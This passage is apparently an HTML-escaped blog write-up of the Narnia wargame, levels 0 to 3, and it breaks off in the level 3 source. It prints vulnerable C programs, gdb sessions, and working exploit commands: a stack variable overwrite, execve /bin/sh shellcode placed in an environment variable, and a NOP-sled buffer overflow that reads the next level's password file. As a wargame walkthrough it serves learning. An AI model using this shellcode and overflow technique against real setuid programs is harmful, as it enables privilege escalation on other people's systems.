                &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;p&gt;Lines 8 and 9 tell us what we need to do. So knowing how variable allocation
on the stack works, we can exploit the setup on lines 5 and 6. &lt;code&gt;buf&lt;/code&gt; is a
fixed size and is allocated &lt;em&gt;after&lt;/em&gt; &lt;code&gt;val&lt;/code&gt;. Therefore it sits above &lt;code&gt;val&lt;/code&gt; on
the stack. As there is no &lt;a href=&#34;https://en.wikipedia.org/wiki/Address_space_layout_randomization&#34;&gt;ASLR&lt;/a&gt;
we should be able to write over the end of &lt;code&gt;buf&lt;/code&gt; and overwrite what is in memory
at &lt;code&gt;val&lt;/code&gt;&amp;rsquo;s location.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s try it&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia0@melinda:/narnia$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;C&amp;#39;*50&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./narnia0 
Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCCCCC
val: 0x43434343
WAY OFF!!!!
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Right, we can confirm that we are able to change the value of &lt;code&gt;val&lt;/code&gt;. Let&amp;rsquo;s
tread a bit more carefully and try to see if we can do it more accurately&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia0@melinda:/narnia$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;C&amp;#39;*20 + &amp;#39;BBBB&amp;#39;&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./narnia0 
Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCBBBB
val: 0x42424242
WAY OFF!!!!
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So there is no space between &lt;code&gt;val&lt;/code&gt; and &lt;code&gt;buf&lt;/code&gt;, therefore 20 characters plus a
further 4 is enough to change val. Let&amp;rsquo;s write in the correct value, reversed of
course because of the endian notation&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia0@melinda:/narnia$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;C&amp;#39;*20 + &amp;#39;\xef\xbe\xad\xde&amp;#39;&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./narnia0
Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
val: 0xdeadbeef
narnia0@melinda:/narnia$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We did it&amp;hellip;. but wait, where&amp;rsquo;s the shell? It&amp;rsquo;s closed, that&amp;rsquo;s where it is. We
need to keep it open. The trick is to append the &lt;code&gt;cat&lt;/code&gt; command to the input&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia0@melinda:/narnia$ &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;C&amp;#39;*20 + &amp;#39;\xef\xbe\xad\xde&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; cat&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./narnia0
Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
val: 0xdeadbeef
id
uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)
whoami
narnia1
cat /etc/narnia_pass/narnia1
[password]
&lt;/pre&gt;&lt;/div&gt;


&lt;h2 id=&#34;level-01:dadecd8e397495e170ebcbe00dd8239d&#34;&gt;Level 01&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;ret)();&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(getenv(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;EGG&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL){&lt;/span&gt;    
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Give me something to execute at the env-variable EGG&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Trying to execute EGG!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;ret&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getenv(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;EGG&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;ret();&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;So here we need to set an environment variable named &lt;code&gt;EGG&lt;/code&gt; to something
we want executed. We can&amp;rsquo;t just pass &lt;code&gt;/bin/bash&lt;/code&gt; as it&amp;rsquo;s going to call whatever
we give it as a function. Ideally we want a shell, so what we need in this case
is the shellcode to do just that.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia1@melinda:/narnia$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;export EGG&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;print &amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&amp;quot;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-02:dadecd8e397495e170ebcbe00dd8239d&#34;&gt;Level 02&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[]){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;128&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Usage: %s argument&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(buf,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf);&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;The biggest clues here are lines 6 and 12. Copying user supplied data
into a fixed sized array without any bound checking is always asking for
trouble. &lt;code&gt;narnia2&lt;/code&gt; binary also runs as setuid narnia3, which leads us to believe
we will be able to control the stack and get it to execute a payload of our
choosing. Of course this will be a shellcode to drop us into a shell.&lt;/p&gt;

&lt;p&gt;First we need to work out how much data is needed to overwrite &lt;code&gt;EIP&lt;/code&gt;. We can
do this by trial and error, or we can use a pattern generator. I am going to
use my &lt;a href=&#34;https://github.com/Svenito/exploit-pattern&#34;&gt;pattern generator&lt;/a&gt; instead
of metasploit&amp;rsquo;s one. I&amp;rsquo;ll create a payload big enugh to overflow the
buffer and then check the value of &lt;code&gt;EIP&lt;/code&gt;. Pasting that back into the pattern
generator will tell us at what location in the pattern the string occurs.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;local $] ./pattern.py 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia2@melinda:/narnia$ gdb -q narnia2
Reading symbols from narnia2...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Starting program: /games/narnia/narnia2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
(gdb) info reg
eax            0x0	0
ecx            0x0	0
edx            0xf7fcb898	-134432616
ebx            0xf7fca000	-134438912
esp            0xffffd640	0xffffd640
ebp            0x65413565	0x65413565
esi            0x0	0
edi            0x0	0
eip            0x37654136	0x37654136
eflags         0x10282	[ SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;local $] ./pattern.py 0x37654136
Pattern 0x37654136 first occurrence at position 140 in pattern.
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;We can control &lt;code&gt;EIP&lt;/code&gt; with whatever we put at position 140 of our payload. But
what do we put there? Well for that we need to figure out where the rest of our
data is going. Using a known payload let&amp;rsquo;s see where our input ends up:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) run $(python -c &amp;quot;print &amp;#39;a&amp;#39; * 140 + &amp;#39;b&amp;#39; * 4&amp;quot;)
Starting program: /games/narnia/narnia2 $(python -c &amp;quot;print &amp;#39;a&amp;#39; * 140 + &amp;#39;b&amp;#39; * 4&amp;quot;)

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/200x $esp
(gdb) x/200x $esp
0xffffd650:	0x00000000	0xffffd6e4	0xffffd6f0	0xf7feacea
0xffffd660:	0x00000002	0xffffd6e4	0xffffd684	0x08049768
0xffffd670:	0x0804821c	0xf7fca000	0x00000000	0x00000000
0xffffd680:	0x00000000	0xed18585e	0xd520bc4e	0x00000000
0xffffd690:	0x00000000	0x00000000	0x00000002	0x08048360
0xffffd6a0:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
0xffffd6b0:	0x00000002	0x08048360	0x00000000	0x08048381
0xffffd6c0:	0x0804845d	0x00000002	0xffffd6e4	0x080484d0
0xffffd6d0:	0x08048540	0xf7feb180	0xffffd6dc	0x0000001c
0xffffd6e0:	0x00000002	0xffffd812	0xffffd828	0x00000000
0xffffd6f0:	0xffffd8b9	0xffffd8cd	0xffffd8dd	0xffffd8f0
0xffffd700:	0xffffd913	0xffffd927	0xffffd930	0xffffd93d
0xffffd710:	0xffffde5e	0xffffde69	0xffffde75	0xffffded3
0xffffd720:	0xffffdeea	0xffffdef9	0xffffdf05	0xffffdf16
0xffffd730:	0xffffdf1f	0xffffdf32	0xffffdf3a	0xffffdf4a
0xffffd740:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000
0xffffd750:	0x00000020	0xf7fdbb60	0x00000021	0xf7fdb000
0xffffd760:	0x00000010	0x1f898b75	0x00000006	0x00001000
0xffffd770:	0x00000011	0x00000064	0x00000003	0x08048034
0xffffd780:	0x00000004	0x00000020	0x00000005	0x00000008
0xffffd790:	0x00000007	0xf7fdc000	0x00000008	0x00000000
0xffffd7a0:	0x00000009	0x08048360	0x0000000b	0x000036b2
0xffffd7b0:	0x0000000c	0x000036b2	0x0000000d	0x000036b2
0xffffd7c0:	0x0000000e	0x000036b2	0x00000017	0x00000000
0xffffd7d0:	0x00000019	0xffffd7fb	0x0000001f	0xffffdfe2
0xffffd7e0:	0x0000000f	0xffffd80b	0x00000000	0x00000000
0xffffd7f0:	0x00000000	0x00000000	0xe8000000	0x7c03ba19
0xffffd800:	0x2bd0895a	0x3866226d	0x69ad5957	0x00363836
0xffffd810:	0x672f0000	0x73656d61	0x72616e2f	0x2f61696e
0xffffd820:	0x6e72616e	0x00326169	0x61616161	0x61616161
0xffffd830:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd840:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd850:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd860:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd870:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd880:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd890:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8a0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8b0:	0x61616161	0x62626262	0x47445800	0x5345535f
0xffffd8c0:	0x4e4f4953	0x3d44495f	0x30333035	0x45485300
0xffffd8d0:	0x2f3d4c4c	0x2f6e6962	0x68736162	0x52455400
0xffffd8e0:	0x78723d4d	0x322d7476	0x6f633635	0x00726f6c
0xffffd8f0:	0x5f485353	0x45494c43	0x323d544e	0x322e3231
0xffffd900:	0x37352e33	0x3136312e	0x35333320	0x34203932
0xffffd910:	0x53003334	0x545f4853	0x2f3d5954	0x2f766564
0xffffd920:	0x2f737470	0x4c003033	0x4c415f43	0x00433d4c
0xffffd930:	0x52455355	0x72616e3d	0x3261696e	0x5f534c00
0xffffd940:	0x4f4c4f43	0x723d5352	0x3a303d73	0x303d6964
0xffffd950:	0x34333b31	0x3d6e6c3a	0x333b3130	0x686d3a36
0xffffd960:	0x3a30303d	0x343d6970	0x33333b30	0x3d6f733a
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;We see our payload start at &lt;code&gt;0xffffd828&lt;/code&gt; with the last 4 bytes at &lt;code&gt;0xffffd8b4&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The buffer gives us 128 bytes to play with. Our shellcode is 25 bytes, so we&amp;rsquo;ll pad the
start with a &lt;a href=&#34;https://en.wikipedia.org/wiki/NOP_slide&#34;&gt;nop sled&lt;/a&gt; to adjust for
the memory offset introduced by &lt;code&gt;gdb&lt;/code&gt;. Then set the &lt;code&gt;EIP&lt;/code&gt; to somewhere in the middle
of the sled&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia2@melinda:/narnia$ ./narnia2 &lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;\x90&amp;#39;*115 + &amp;#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&amp;#39; + &amp;#39;\x60\xd8\xff\xff&amp;#39;&amp;quot;`&lt;/span&gt;
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-03:dadecd8e397495e170ebcbe00dd8239d&#34;&gt;Level 03&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;fcntl.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt; &lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
 
        &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;ifd,&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;ofd;&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ofile[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/dev/null&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ifile[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;32&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
 
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;usage, %s file, will send contents of file 2 /dev/null&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
 
        &lt;span style=&#34;color: #75715e&#34;&gt;/* open files */&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(ifile,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
